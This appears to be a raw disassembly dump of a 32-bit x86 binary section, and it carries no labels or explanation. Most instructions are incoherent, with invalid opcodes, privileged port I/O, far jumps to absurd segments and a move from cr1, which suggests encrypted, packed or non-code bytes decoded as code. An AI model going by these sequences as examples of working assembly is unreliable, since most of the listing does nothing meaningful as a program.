  40425a:	in     eax,0xa4
  40425c:	cmp    eax,0x5e836db3
  404261:	adc    bh,BYTE PTR ds:0xd76b555e
  404267:	outs   dx,BYTE PTR ds:[esi]
  404268:	gs xor edx,ecx
  40426b:	jl     0x4042b0
  40426d:	dec    esp
  40426e:	inc    ecx
  40426f:	or     DWORD PTR [edi-0x69],0x6b169c43
  404276:	mov    ds:0x85891c1f,eax
  40427b:	scas   al,BYTE PTR es:[edi]
  40427c:	outs   dx,DWORD PTR ds:[esi]
  40427d:	xchg   ebx,eax
  40427e:	outs   dx,BYTE PTR ds:[esi]
  40427f:	imul   ebx,edi,0xfffffffa
  404282:	push   0xb52f7db7
  404287:	dec    ebp
  404288:	cmp    al,0x3f
  40428a:	inc    ecx
  40428b:	inc    esi
  40428c:	shl    DWORD PTR ds:0x702df914,0x81
  404293:	lahf   
  404294:	cld    
  404295:	inc    esp
  404296:	cmp    dh,ah
  404298:	xchg   edi,eax
  404299:	jo     0x404233
  40429b:	mov    edi,0x4eca711b
  4042a0:	aad    0xbe
  4042a2:	push   edx
  4042a3:	pushf  
  4042a4:	lods   eax,DWORD PTR ds:[esi]
  4042a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042a6:	int3   
  4042a7:	test   DWORD PTR [edi-0x240ca8aa],0x218b6bfe
  4042b1:	in     eax,dx
  4042b2:	mov    bl,0x94
  4042b4:	jbe    0x404302
  4042b6:	aad    0xb1
  4042b8:	mov    DWORD PTR [edi+0x4c],edi
  4042bb:	sub    al,0xbd
  4042bd:	retf   0x3721
  4042c0:	sub    eax,0xa970aa3b
  4042c5:	rol    BYTE PTR [edi+0x60],cl
  4042c8:	hlt    
  4042c9:	push   0x6f22e6b9
  4042ce:	retf   0x9382
  4042d1:	stos   BYTE PTR es:[edi],al
  4042d2:	adc    bh,BYTE PTR [ecx+0x1]
  4042d5:	mov    ebp,0xc3945ba2
  4042da:	inc    edi
  4042db:	je     0x404288
  4042dd:	jge    0x40428c
  4042df:	jecxz  0x4042af
  4042e1:	loope  0x404278
  4042e3:	fdivr  QWORD PTR [ebx+0x5b]
  4042e6:	adc    edi,DWORD PTR [eax+ebx*8]
  4042e9:	or     ecx,DWORD PTR [ebp+0x5d]
  4042ec:	dec    edx
  4042ed:	adc    al,0x1c
  4042ef:	cdq    
  4042f0:	adc    al,BYTE PTR [edi]
  4042f2:	inc    eax
  4042f3:	jo     0x4042f9
  4042f5:	or     bh,BYTE PTR [ebx-0x60]
  4042f8:	jo     0x4042e5
  4042fa:	mov    ds:0x63790412,al
  4042ff:	pop    edx
  404300:	jmp    0x404293
  404302:	in     al,0xe4
  404304:	popa   
  404305:	xchg   esi,eax
  404306:	cwde   
  404307:	mov    WORD PTR [ecx-0x1e],ss
  40430a:	jmp    0x4042c8
  40430c:	add    bh,BYTE PTR [ecx+0x1e325bb1]
  404312:	cmp    DWORD PTR [ebx],ecx
  404314:	ja     0x404348
  404316:	dec    eax
  404317:	scas   eax,DWORD PTR es:[edi]
  404318:	leave  
  404319:	call   DWORD PTR [ecx-0x5c]
  40431c:	inc    ecx
  40431d:	in     eax,0x45
  40431f:	mov    edi,0x8754938a
  404324:	stc    
  404325:	gs xchg edi,eax
  404327:	fldcw  WORD PTR [eax-0x6813037f]
  40432d:	dec    esp
  40432e:	or     DWORD PTR [edi+0x2a],0x2ef1b107
  404335:	sub    eax,0xa2e86484
  40433a:	into   
  40433b:	in     al,dx
  40433c:	xor    al,0x49
  40433e:	pop    es
  40433f:	dec    esp
  404340:	lea    eax,[esi-0x251bb8b0]
  404346:	mov    bp,0xc4b4
  40434a:	push   edx
  40434b:	pop    ss
  40434c:	cmp    esp,DWORD PTR [ecx+esi*1+0x41de3929]
  404353:	add    esi,ebx
  404355:	sub    esi,ebp
  404357:	inc    ebx
  404358:	pop    ebp
  404359:	sub    BYTE PTR [edi+0x6f],0xb3
  40435d:	inc    ebp
  40435e:	mov    eax,0xc8fd0de0
  404363:	inc    esp
  404364:	imul   ebx,DWORD PTR [eax],0x1
  404367:	daa    
  404368:	mov    eax,ds:0xb3f8d918
  40436d:	pop    ebp
  40436e:	mov    ebp,0x9b8284d6
  404373:	fist   WORD PTR [ebx+0x67]
  404376:	pop    ebx
  404377:	aaa    
  404378:	mov    ah,0x16
  40437a:	xchg   esp,eax
  40437b:	call   0x69b4:0x3bed8b1b
  404382:	retf   0xc2cb
  404385:	xor    al,0xc9
  404387:	fdiv   QWORD PTR [eax+ebx*4]
  40438a:	jl     0x40436c
  40438c:	repz pop ecx
  40438e:	jnp    0x404403
  404390:	mov    bh,0xb6
  404392:	sbb    ebx,DWORD PTR [edi]
  404394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404395:	xlat   BYTE PTR ds:[ebx]
  404396:	and    cl,BYTE PTR [edx-0x2b0873cf]
  40439c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40439d:	mov    eax,ds:0x913b12a9
  4043a2:	cwde   
  4043a3:	inc    edx
  4043a4:	imul   ebp,DWORD PTR [ecx+0x45c05eaf],0x15
  4043ab:	inc    ecx
  4043ac:	xchg   edx,eax
  4043ad:	and    DWORD PTR [eax],eax
  4043af:	imul   edx,DWORD PTR [edx],0xb3336ae2
  4043b5:	push   ss
  4043b6:	dec    esi
  4043b7:	sbb    eax,0x11b46d7b
  4043bc:	xlat   BYTE PTR ds:[ebx]
  4043bd:	push   esp
  4043be:	xor    bl,BYTE PTR [edi]
  4043c0:	or     al,0x20
  4043c2:	push   esp
  4043c3:	ror    DWORD PTR [ebp+0x62884447],cl
  4043c9:	sti    
  4043ca:	mov    dh,0xb3
  4043cc:	ret    0x2d53
  4043cf:	mov    al,ds:0xb6c90985
  4043d4:	out    dx,eax
  4043d5:	(bad)  
  4043d6:	scas   eax,DWORD PTR es:[edi]
  4043d7:	mov    DWORD PTR [ebx+0x6],edx
  4043da:	add    eax,0xfe9e0471
  4043df:	sti    
  4043e0:	addr16 (bad) 
  4043e2:	aas    
  4043e3:	jmp    0xc15fd392
  4043e8:	push   edx
  4043e9:	jge    0x404457
  4043eb:	int3   
  4043ec:	mov    ecx,0xce492675
  4043f1:	pusha  
  4043f2:	rcr    DWORD PTR [edx+0x5e],cl
  4043f5:	pop    eax
  4043f6:	daa    
  4043f7:	pop    eax
  4043f8:	cld    
  4043f9:	add    BYTE PTR [ebx+0x3f236f5c],bh
  4043ff:	mov    eax,ds:0x6a9f3945
  404404:	enter  0xa455,0xb2
  404408:	adc    al,0xe1
  40440a:	sbb    esp,DWORD PTR [edi+ebp*4+0x54c92c2a]
  404411:	out    dx,al
  404412:	popf   
  404413:	enter  0x9347,0x8e
  404417:	mov    bl,0x4a
  404419:	xchg   esi,eax
  40441a:	(bad)  
  40441b:	iret   
  40441c:	pop    es
  40441d:	sbb    bh,cl
  40441f:	push   edx
  404420:	cwde   
  404421:	and    BYTE PTR [edi],dh
  404423:	push   0xa66fd2bb
  404428:	push   ss
  404429:	outs   dx,DWORD PTR ds:[esi]
  40442a:	mov    dl,0x41
  40442c:	mov    al,0xb2
  40442e:	xchg   edx,eax
  40442f:	aas    
  404430:	mov    WORD PTR [ecx],gs
  404432:	or     ch,BYTE PTR [edx+ebx*1]
  404435:	les    esi,FWORD PTR [ebx+ebx*2-0x45]
  404439:	xor    al,BYTE PTR [ebp-0x48978e22]
  40443f:	fwait
  404440:	jmp    0xd53c:0xa180f0c1
  404447:	push   0x515b40ba
  40444c:	icebp  
  40444d:	mov    bh,0x59
  40444f:	(bad)  
  404450:	sub    al,0x1e
  404452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404453:	rol    BYTE PTR [ecx+0x1c0e85e4],cl
  404459:	es fucomp st(2)
  40445c:	shl    BYTE PTR [edx+ebx*2],1
  40445f:	(bad)  
  404460:	inc    eax
  404461:	ror    BYTE PTR [eax+0x1e],cl
  404464:	dec    edx
  404465:	call   0x53a77bae
  40446a:	adc    BYTE PTR [esi-0x34dae06f],al
  404470:	sahf   
  404471:	fidiv  DWORD PTR ds:0xe7191c2d
  404477:	dec    ebx
  404478:	jae    0x40446f
  40447a:	sbb    BYTE PTR [eax],bl
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044ae
  404490:	xchg   edx,eax
  404491:	icebp  
  404492:	sbb    BYTE PTR [esi+0x18],0x7e
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x40443d
  40449c:	pop    esp
  40449d:	inc    edi
  40449e:	xchg   edi,eax
  40449f:	aaa    
  4044a0:	not    DWORD PTR ds:0xaa4f2583
  4044a6:	int3   
  4044a7:	into   
  4044a8:	and    esi,DWORD PTR [ecx+0x66]
  4044ab:	mov    DWORD PTR [eax],ebx
  4044ad:	mov    eax,ds:0x83cc8e0e
  4044b2:	das    
  4044b3:	cli    
  4044b4:	inc    edi
  4044b5:	pop    es
  4044b6:	sti    
  4044b7:	inc    edi
  4044b8:	ror    DWORD PTR [edi+ebx*1],1
  4044bb:	ins    BYTE PTR es:[edi],dx
  4044bc:	fst    st(0)
  4044be:	jl     0x404512
  4044c0:	jne    0x404462
  4044c2:	mov    BYTE PTR [esi+0xf],al
  4044c5:	mov    eax,0xd290e396
  4044ca:	xor    eax,0x6ddb693f
  4044cf:	fs jg  0x40453c
  4044d2:	mov    eax,ds:0xb09c48eb
  4044d7:	clc    
  4044d8:	lds    ebp,FWORD PTR fs:[ecx-0x6ed59652]
  4044df:	pop    esi
  4044e0:	jae    0x404515
  4044e2:	xor    DWORD PTR [ecx+0x25],0xde8a06f7
  4044e9:	push   0xd17dd406
  4044ee:	(bad)  
  4044ef:	push   eax
  4044f0:	ret    
  4044f1:	sahf   
  4044f2:	push   cs
  4044f3:	pop    ecx
  4044f4:	xchg   esp,eax
  4044f5:	into   
  4044f6:	xor    BYTE PTR [edi],ch
  4044f8:	pop    ebx
  4044f9:	je     0x404513
  4044fb:	or     BYTE PTR [ebx+0x7],al
  4044fe:	aaa    
  4044ff:	pop    ebx
  404500:	dec    edi
  404501:	fwait
  404502:	adc    ecx,edx
  404504:	adc    DWORD PTR [ebx-0x4a79d7b9],edi
  40450a:	aam    0xa7
  40450c:	xor    eax,0xded753ad
  404511:	into   
  404512:	cwde   
  404513:	nop
  404514:	jecxz  0x404569
  404516:	into   
  404517:	shl    BYTE PTR [edi-0x44fa56b3],0x48
  40451e:	add    eax,0xa8a549f8
  404523:	and    BYTE PTR [edx+0x46],0x9b
  404527:	mov    DWORD PTR [ecx+0x60],edi
  40452a:	aad    0xe0
  40452c:	scas   al,BYTE PTR es:[edi]
  40452d:	pop    ebx
  40452e:	add    DWORD PTR [edx],0xa3e43af8
  404534:	je     0x404554
  404536:	scas   eax,DWORD PTR es:[edi]
  404537:	test   eax,0x19693d25
  40453c:	pop    eax
  40453d:	cmp    al,0xcb
  40453f:	aas    
  404540:	mov    esp,0x9827c9a3
  404545:	retf   
  404546:	sbb    ebp,esp
  404548:	jne    0x4045a3
  40454a:	inc    eax
  40454b:	dec    edx
  40454c:	das    
  40454d:	xchg   ebx,eax
  40454e:	cmc    
  40454f:	and    DWORD PTR [edx],ecx
  404551:	lahf   
  404552:	in     al,0x69
  404554:	in     eax,dx
  404555:	mov    ch,0x91
  404557:	pop    ebx
  404558:	push   edi
  404559:	nop
  40455a:	mov    edx,0x327a0452
  40455f:	sub    al,0xae
  404561:	sbb    eax,0x593d8ef5
  404566:	or     ecx,DWORD PTR [edx]
  404568:	dec    esp
  404569:	test   dh,al
  40456b:	add    DWORD PTR [ebx-0x23],ebx
  40456e:	and    eax,0x55008a52
  404573:	and    bh,BYTE PTR [edi+0x38]
  404576:	pop    edx
  404577:	mov    esp,0x5ce60527
  40457c:	mov    edi,0x14133fb0
  404581:	pop    esp
  404582:	imul   ebx,DWORD PTR [edi+0x67],0x3f2f5e3
  404589:	imul   ebp,DWORD PTR [esi+ebp*8],0x3a1377c
  404590:	mov    al,0xc6
  404592:	std    
  404593:	or     al,0xce
  404595:	dec    esp
  404596:	stos   BYTE PTR es:[edi],al
  404597:	mov    eax,0x1b712379
  40459c:	test   esi,edi
  40459e:	sub    ah,dl
  4045a0:	adc    ah,BYTE PTR [edi+0x2e]
  4045a3:	push   esi
  4045a4:	and    BYTE PTR [esi-0x18965425],dl
  4045aa:	je     0x4045ef
  4045ac:	leave  
  4045ad:	rol    DWORD PTR [eax],1
  4045af:	pop    ebx
  4045b0:	pop    es
  4045b1:	jle    0x404606
  4045b3:	loopne 0x4045f2
  4045b5:	pop    eax
  4045b6:	or     dl,BYTE PTR [edi]
  4045b8:	popa   
  4045b9:	dec    eax
  4045ba:	cdq    
  4045bb:	sub    eax,0xcc7c5c74
  4045c0:	imul   edx,DWORD PTR [edi-0x45],0x19
  4045c4:	mov    ah,BYTE PTR [ecx+0x70e60cd5]
  4045ca:	mov    eax,0x1c10fe9c
  4045cf:	adc    eax,0xf4e347b4
  4045d4:	jmp    0xcf5e:0xfc44d392
  4045db:	pop    ebx
  4045dc:	cmp    BYTE PTR [edi+0x1ff0cc14],cl
  4045e2:	lods   al,BYTE PTR ds:[esi]
  4045e3:	inc    ecx
  4045e4:	inc    ecx
  4045e5:	outs   dx,DWORD PTR ds:[esi]
  4045e6:	test   BYTE PTR [edi],0x84
  4045e9:	shr    DWORD PTR [ebp-0x65],0xd3
  4045ed:	lea    esp,[ebx-0x5906402d]
  4045f3:	xchg   BYTE PTR [ebp+0x3db4c615],al
  4045f9:	pushf  
  4045fa:	add    eax,0xe019b79
  4045ff:	scas   al,BYTE PTR es:[edi]
  404600:	jge    0x404612
  404602:	jle    0x404630
  404604:	test   DWORD PTR [edx+0x11b97f05],ebx
  40460a:	mov    ah,0x66
  40460c:	aam    0x9
  40460e:	out    0xdb,al
  404610:	xor    ebp,ebp
  404612:	fdivr  DWORD PTR [edx-0x46]
  404615:	jno    0x404621
  404617:	stos   DWORD PTR es:[edi],eax
  404618:	add    eax,0xf6c81451
  40461d:	sbb    BYTE PTR [esi+0x28800d6d],ah
  404623:	or     BYTE PTR [ebx-0x3d],bl
  404626:	aaa    
  404627:	addr16 nop
  404629:	(bad)  
  40462a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40462b:	xor    BYTE PTR [esi+edx*1+0x69],ah
  40462f:	(bad)  
  404630:	lahf   
  404631:	ja     0x40466e
  404633:	dec    ebx
  404634:	xchg   esi,eax
  404635:	pop    edi
  404636:	or     eax,0xb99a9cf4
  40463b:	or     edi,DWORD PTR [edi-0xc]
  40463e:	jae    0x40464e
  404640:	push   es
  404641:	shl    BYTE PTR [esi],0xf4
  404644:	mov    ch,0x3e
  404646:	mov    esp,0x415fccff
  40464b:	out    dx,al
  40464c:	pop    ds
  40464d:	mov    dh,0x6f
  40464f:	inc    eax
  404650:	and    al,0xd5
  404652:	or     DWORD PTR [edx+0x24],esp
  404655:	inc    ebx
  404656:	push   es
  404657:	sbb    bh,cl
  404659:	sub    edi,DWORD PTR [edi+0x27]
  40465c:	call   0x9f99b992
  404661:	and    BYTE PTR [edx],ah
  404663:	pusha  
  404664:	and    cl,cl
  404666:	xchg   ecx,eax
  404667:	(bad)  
  404668:	jmp    0x4046c0
  40466a:	push   ebp
  40466b:	fsubr  DWORD PTR [esi+0x52]
  40466e:	push   ss
  40466f:	jp     0x404671
  404671:	into   
  404672:	nop
  404673:	lods   al,BYTE PTR ds:[esi]
  404674:	repz xchg edx,eax
  404676:	ss call 0xa76f:0xa94afca6
  40467e:	sahf   
  40467f:	cmp    al,0x63
  404681:	or     ecx,DWORD PTR [esi-0x11]
  404684:	cmp    eax,0x6813ff69
  404689:	jne    0x40461c
  40468b:	or     ecx,DWORD PTR [esi+ebx*4+0x68158eb0]
  404692:	sahf   
  404693:	pop    ecx
  404694:	adc    BYTE PTR [ebx],dh
  404696:	ja     0x404669
  404698:	cs xchg ecx,eax
  40469a:	dec    esi
  40469b:	call   FWORD PTR [edx+0x471858a9]
  4046a1:	into   
  4046a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a3:	std    
  4046a4:	cdq    
  4046a5:	scas   al,BYTE PTR es:[edi]
  4046a6:	sti    
  4046a7:	xchg   ebp,eax
  4046a8:	retf   
  4046a9:	inc    ebx
  4046aa:	adc    BYTE PTR [esi-0x70cf1d62],0x16
  4046b1:	sub    BYTE PTR [esi],ch
  4046b3:	inc    edi
  4046b4:	shr    BYTE PTR [ebp+ebx*8-0x23b09a05],0x3c
  4046bc:	xor    BYTE PTR [edx-0x3992ac96],ch
  4046c2:	lds    edx,FWORD PTR [ebp+0x19]
  4046c5:	ret    
  4046c6:	(bad)  
  4046c7:	in     al,0xe3
  4046c9:	or     eax,0xa162231e
  4046ce:	test   al,0x53
  4046d0:	jb     0x404735
  4046d2:	fs imul edi,esi,0x2f
  4046d6:	retf   
  4046d7:	xchg   ebx,eax
  4046d8:	push   eax
  4046d9:	lahf   
  4046da:	mov    esp,0x8c6a00a7
  4046df:	das    
  4046e0:	out    0xb,al
  4046e2:	outs   dx,BYTE PTR ds:[esi]
  4046e3:	xchg   esp,eax
  4046e4:	sub    ecx,esi
  4046e6:	pushf  
  4046e7:	pop    eax
  4046e8:	jl     0x4046a4
  4046ea:	and    al,0x2a
  4046ec:	cmp    ebp,edx
  4046ee:	rcl    BYTE PTR [esp+eiz*4-0x47],cl
  4046f2:	push   ds
  4046f3:	(bad)  
  4046f4:	cmc    
  4046f5:	cld    
  4046f6:	add    BYTE PTR [edx+0x55],al
  4046f9:	xchg   ebp,eax
  4046fa:	inc    ebx
  4046fb:	or     eax,0x4827dab3
  404700:	scas   eax,DWORD PTR es:[edi]
  404701:	cmp    esp,edi
  404703:	xor    al,BYTE PTR [edx]
  404705:	xchg   ebp,eax
  404706:	lea    edx,[edi-0xf97af2e]
  40470c:	mov    DWORD PTR [ebx+0x4c],ebx
  40470f:	xchg   cl,dl
  404711:	imul   eax,DWORD PTR [ebx+ebp*8+0x6b],0x31
  404716:	pop    edi
  404717:	jne    0x404739
  404719:	mov    gs,edx
  40471b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40471c:	sub    dl,ch
  40471e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40471f:	cwde   
  404720:	add    DWORD PTR [edx+0x38],edi
  404723:	fwait
  404724:	rol    DWORD PTR [ecx-0x743b4c8c],0x89
  40472b:	mov    dh,0xe4
  40472d:	mov    eax,0x5f856d5b
  404732:	mov    esp,0xa828f844
  404737:	mov    ecx,0xd50f217a
  40473c:	mov    WORD PTR [ebp-0x9],?
  40473f:	push   ecx
  404740:	pop    edx
  404741:	sahf   
  404742:	in     al,dx
  404743:	ins    DWORD PTR es:[edi],dx
  404744:	jo     0x4046f9
  404746:	cmp    BYTE PTR [esi-0x4f],ch
  404749:	cdq    
  40474a:	and    eax,0xef631d68
  40474f:	cmp    edx,ecx
  404751:	xchg   esp,eax
  404752:	shl    BYTE PTR [ecx+0x3b],cl
  404755:	retf   
  404756:	out    0x75,al
  404758:	jnp    0x404771
  40475a:	lock cmp al,0xe4
  40475d:	test   DWORD PTR [ecx+0x40],esi
  404760:	jae    0x4046f2
  404762:	xor    cl,BYTE PTR [eax+0xb]
  404765:	cwde   
  404766:	jmp    0x1b4a:0x52c6e5a8
  40476d:	jecxz  0x40473e
  40476f:	jne    0x4046f4
  404771:	shl    DWORD PTR [ebx-0x3b],cl
  404774:	inc    edi
  404775:	and    BYTE PTR [esp+esi*1-0x26],0xc6
  40477a:	nop
  40477b:	loope  0x4047c9
  40477d:	dec    eax
  40477e:	jb     0x404786
  404780:	retf   0xd033
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	(bad)  
  4047b5:	cmp    al,0x2
  4047b7:	jnp    0x404771
  4047b9:	daa    
  4047ba:	jle    0x40483a
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047a1
  4047c1:	cmp    ebx,eax
  4047c3:	fld    TBYTE PTR [ebp+0x7d]
  4047c6:	xchg   ebx,eax
  4047c8:	int    0x19
  4047ca:	mov    ecx,0x1fd9f95d
  4047cf:	fwait
  4047d0:	idiv   ecx
  4047d2:	jo     0x404772
  4047d4:	retf   
  4047d5:	add    BYTE PTR [edx+0x76201d6b],al
  4047db:	sbb    al,0x6
  4047dd:	inc    ebx
  4047de:	fcomp  DWORD PTR [eax+0x75]
  4047e1:	sub    al,0x7e
  4047e3:	dec    ebp
  4047e4:	push   cs
  4047e5:	sub    DWORD PTR [esp+ecx*8-0x15dcd8e3],ecx
  4047ec:	sbb    BYTE PTR [edi+0x25],bh
  4047ef:	imul   eax,DWORD PTR [edx],0x2fb60d56
  4047f5:	scas   al,BYTE PTR es:[edi]
  4047f6:	inc    eax
  4047f7:	test   BYTE PTR [edi+ebp*2-0x4fff89d4],al
  4047fe:	cmp    ecx,ebp
  404800:	mov    ds:0xc662e947,eax
  404805:	mov    ds:0x550a95ca,al
  40480a:	xchg   esi,eax
  40480b:	pop    edi
  40480c:	mov    cs,WORD PTR [ebp+0x77]
  40480f:	lock pop ecx
  404811:	xchg   ebp,eax
  404812:	jae    0x404815
  404814:	mov    dl,0xcd
  404816:	adc    ah,bl
  404818:	mov    dh,0xe3
  40481a:	push   edx
  40481b:	add    esi,edx
  40481d:	hlt    
  40481e:	jle    0x40480b
  404820:	(bad)  
  404821:	mov    esi,0xff591780
  404826:	retf   0x4ae3
  404829:	test   al,0x2
  40482b:	shl    DWORD PTR [esi],1
  40482d:	push   0x3d1b8334
  404832:	add    bh,BYTE PTR [ecx]
  404834:	jno    0x404808
  404836:	shl    edi,0xc5
  404839:	pusha  
  40483a:	stc    
  40483b:	fistp  DWORD PTR [eax+eiz*2+0x7b84ba7b]
  404842:	or     bl,ch
  404844:	jo     0x4047f2
  404846:	add    eax,0x5cffed4a
  40484b:	fisubr DWORD PTR [edi+ecx*4+0x79]
  40484f:	mov    ds:0xf49c4cdf,eax
  404854:	or     esi,0x76
  404857:	mov    ds:0xa6decde5,al
  40485c:	xor    BYTE PTR [edi-0x2fea796d],ah
  404862:	or     cl,BYTE PTR [esi]
  404864:	adc    BYTE PTR [ebx+0x12daacc9],bl
  40486a:	jb     0x4048a0
  40486c:	ret    0xa1ed
  40486f:	test   BYTE PTR [edi],ah
  404871:	out    0x53,al
  404873:	mov    eax,ds:0xd377709c
  404878:	mov    edx,0xe0567c18
  40487d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40487e:	add    ecx,DWORD PTR [ecx]
  404880:	(bad)  
  404881:	in     al,dx
  404882:	mov    bl,al
  404884:	jmp    0x404849
  404886:	ins    DWORD PTR es:[edi],dx
  404887:	push   ss
  404888:	ret    
  404889:	jmp    0xb3a0b482
  40488e:	pop    edx
  40488f:	mov    dl,0xc
  404891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404892:	sub    DWORD PTR [edi-0x5d],edx
  404895:	out    dx,eax
  404896:	fiadd  WORD PTR [ecx-0x1a600e90]
  40489c:	pop    esi
  40489d:	jmp    0xc4c9:0x703ac442
  4048a4:	xchg   ecx,eax
  4048a5:	push   cs
  4048a6:	in     eax,0xf0
  4048a8:	jo     0x404914
  4048aa:	push   edx
  4048ab:	dec    eax
  4048ac:	dec    esp
  4048ad:	repz retf 
  4048af:	std    
  4048b0:	mov    fs,WORD PTR [esi-0x1]
  4048b3:	in     al,dx
  4048b4:	xlat   BYTE PTR ds:[ebx]
  4048b5:	call   0x173ffaac
  4048ba:	dec    ecx
  4048bb:	mov    ebp,0xb3fbc1ef
  4048c0:	or     bh,0xe5
  4048c3:	sub    ebx,DWORD PTR [edx+0x85fd8bb]
  4048c9:	or     ecx,esi
  4048cb:	(bad)  
  4048cc:	inc    edx
  4048cd:	in     eax,dx
  4048ce:	(bad)  
  4048cf:	mov    ds:0x2a03e5ee,al
  4048d4:	pusha  
  4048d5:	mov    eax,0xaa133bae
  4048da:	hlt    
  4048db:	sub    esi,DWORD PTR [edi+0x25]
  4048de:	fs jl  0x40490c
  4048e1:	aaa    
  4048e2:	adc    BYTE PTR [ecx-0x70],0xb
  4048e6:	sub    esp,DWORD PTR es:[edx]
  4048e9:	mov    ch,0x44
  4048eb:	inc    ecx
  4048ec:	and    DWORD PTR [ecx],ebp
  4048ee:	pop    edi
  4048ef:	adc    eax,0xc143da7b
  4048f4:	repz mov WORD PTR [esi+edx*4-0x799c1965],ds
  4048fc:	sbb    edx,DWORD PTR [ecx+ebx*1+0x65]
  404900:	fisub  WORD PTR [eax-0x6e]
  404903:	int    0x83
  404905:	lahf   
  404906:	in     al,0x71
  404908:	sub    ebp,DWORD PTR [ebx]
  40490a:	mov    cs,WORD PTR [eax+edx*4+0x271f6442]
  404911:	in     al,dx
  404912:	and    dh,BYTE PTR [edi]
  404914:	inc    ebp
  404915:	stos   BYTE PTR es:[edi],al
  404916:	addr16 retf 0xc0ec
  40491a:	inc    ebx
  40491b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40491d:	jecxz  0x404916
  40491f:	jl     0x4048cc
  404921:	add    cl,BYTE PTR [edi-0x74]
  404924:	stos   DWORD PTR es:[edi],eax
  404925:	rcl    BYTE PTR [ecx-0x2f],cl
  404928:	push   0x43
  40492a:	clc    
  40492b:	mov    ch,0xb2
  40492d:	test   DWORD PTR [ebx],eax
  40492f:	and    BYTE PTR [edi-0x6736561e],dh
  404935:	cmc    
  404936:	(bad)  
  404937:	(bad)  
  404939:	mov    ds:0xc6a1c64d,al
  40493e:	sti    
  40493f:	out    dx,eax
  404940:	and    eax,0x26281b6d
  404945:	jae    0x404918
  404947:	xchg   DWORD PTR [edx+0x8796dd4],esi
  40494d:	adc    esp,ecx
  40494f:	cld    
  404950:	mov    bh,0x68
  404952:	mov    cl,0xdd
  404954:	sbb    al,0xad
  404956:	ss int3 
  404958:	jnp    0x4049b2
  40495a:	lods   al,BYTE PTR ds:[esi]
  40495b:	das    
  40495c:	retf   
  40495d:	push   ds
  40495e:	push   esi
  40495f:	inc    ebx
  404960:	clc    
  404961:	inc    esi
  404962:	dec    BYTE PTR [ebp+0x721ff4e6]
  404968:	pop    ds
  404969:	inc    ebx
  40496a:	in     eax,0x99
  40496c:	pop    ss
  40496d:	js     0x404925
  40496f:	sar    BYTE PTR ds:0x83907e23,0xde
  404976:	addr16 (bad) 
  404978:	imul   ebp,esi,0xede18e97
  40497e:	sbb    ch,bl
  404980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404981:	aaa    
  404982:	aad    0xf
  404984:	addr16 in al,dx
  404986:	test   eax,0x925ba6f9
  40498b:	dec    edi
  40498c:	cmp    dh,BYTE PTR [ebx-0x49]
  40498f:	cli    
  404990:	call   0x8a7670b5
  404995:	mov    DWORD PTR [ebx+ecx*8+0xc],esp
  404999:	add    DWORD PTR [esp+esi*1-0x3],esi
  40499d:	sub    eax,0x30ca1816
  4049a2:	dec    esp
  4049a3:	pushf  
  4049a4:	adc    BYTE PTR [ecx],bl
  4049a6:	js     0x404a06
  4049a8:	loopne 0x40494b
  4049aa:	push   DWORD PTR [edi]
  4049ac:	into   
  4049ad:	xchg   edi,eax
  4049ae:	(bad)
  4049b1:	out    dx,eax
  4049b2:	xor    al,0x95
  4049b4:	arpl   WORD PTR [edx+0x72478132],ax
  4049ba:	and    eax,0xa74af92d
  4049bf:	jae    0x404971
  4049c1:	mov    ecx,0x5b1afa71
  4049c6:	mov    eax,cr1
  4049c9:	adc    ch,BYTE PTR [eax-0x31]
  4049cc:	ror    DWORD PTR [eax+0x7c],cl
  4049cf:	es jle 0x4049d2
  4049d2:	les    edx,FWORD PTR [eax]
  4049d4:	adc    bh,bl
  4049d6:	adc    DWORD PTR [eax],ebp
  4049d8:	arpl   WORD PTR [ebx+0x1fecba40],cx
  4049de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049df:	outs   dx,BYTE PTR ds:[esi]
  4049e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e1:	xchg   esi,eax
  4049e2:	test   eax,0x2d2c5296
  4049e7:	sub    dh,BYTE PTR [ecx+0x729fbefe]
  4049ed:	fdiv   QWORD PTR [esp+ebp*8]
  4049f0:	dec    DWORD PTR [edx+0x75d6b237]
  4049f6:	cmp    al,0x51
  4049f8:	pop    es
  4049f9:	sub    dh,BYTE PTR [eax-0x25]
  4049fc:	add    DWORD PTR [edi],ebp
  4049fe:	mov    al,0x68
  404a00:	mov    eax,ds:0x20d0058b
  404a05:	into   
  404a06:	xlat   BYTE PTR ds:[ebx]
  404a07:	mov    ebx,0xb80ab59c
  404a0c:	(bad)  
  404a0d:	adc    bh,bl
  404a0f:	push   ebp
  404a10:	cmp    BYTE PTR [edi-0xb1f729d],bh
  404a16:	xor    ah,cl
  404a18:	arpl   WORD PTR [ecx+0x35],ax
  404a1b:	es mov esi,0xa5375f20
